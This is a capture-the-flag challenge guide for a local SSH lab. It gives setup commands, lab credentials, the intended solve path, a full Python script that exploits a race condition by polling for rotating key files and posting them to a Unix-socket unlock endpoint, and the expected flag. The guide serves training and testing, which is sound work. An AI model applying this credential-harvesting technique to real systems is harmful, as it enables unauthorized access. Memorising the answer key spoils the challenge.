# 11-honeyport-heist - Testing & Solve Guide

## 1. Challenge setup
- **Start**: `cd ctf-platform/challenges/11-honeyport-heist && docker compose up -d`
- **Ports**: 2223
- **Protocol**: SSH
- **Credentials**: Username: `ctf_player` | Password: `player`

## 2. How to access it
```bash
ssh ctf_player@127.0.0.1 -p 2223
```

## 3. Intended solve path
1. SSH into the worker station: `ssh ctf_player@127.0.0.1 -p 2223` (password: `player`).
2. Enumerate the filesystem: note `/auth_sync` and `/tmp_sock/.sys.sock`.
3. Notice that background bot processes periodically generate rotating keys in `/auth_sync`.
4. Exploit the race condition: poll `/auth_sync` for new `.key` / `.vault` files and quickly submit them to `/tmp_sock/.sys.sock` at `POST /api/vault/unlock` with `auth=<TOKEN>`.
5. The endpoint returns JSON containing the flag.

## 4. Expected solution
**⚠️ SPOILER — INTENDED SOLUTION**

### Solution Script (exploit.py)
```python
import os, time, subprocess, json, sys

sock = "/tmp_sock/.sys.sock"
auth_dir = "/auth_sync"

print("[*] Hunting for active vault tokens in /auth_sync...")
start = time.time()
while time.time() - start < 60:
    for f in os.listdir(auth_dir):
        if f.endswith('.key') or f.startswith('.vault'):
            try:
                with open(os.path.join(auth_dir, f), 'r') as fp:
                    key = fp.read().strip()
                if key:
                    cmd = ['curl', '-s', '-X', 'POST', '--unix-socket', sock,
                           'http://localhost/api/vault/unlock', '-d', f'auth={key}']
                    res = json.loads(subprocess.check_output(cmd).decode())
                    if 'flag' in res:
                        print('[+] FLAG RECOVERED:', res['flag'])
                        sys.exit(0)
            except Exception:
                pass
    time.sleep(0.01)
print('[-] Timeout')
sys.exit(1)
```

**Expected Flag**: `YUVA{gh0st_1n_th3_m4ch1n3_d3f34t3d}`

## 5. Validation checklist
- [x] Challenge starts correctly
- [x] Connection works on SSH port 2223
- [x] Intended vulnerability works
- [x] Flag is obtainable
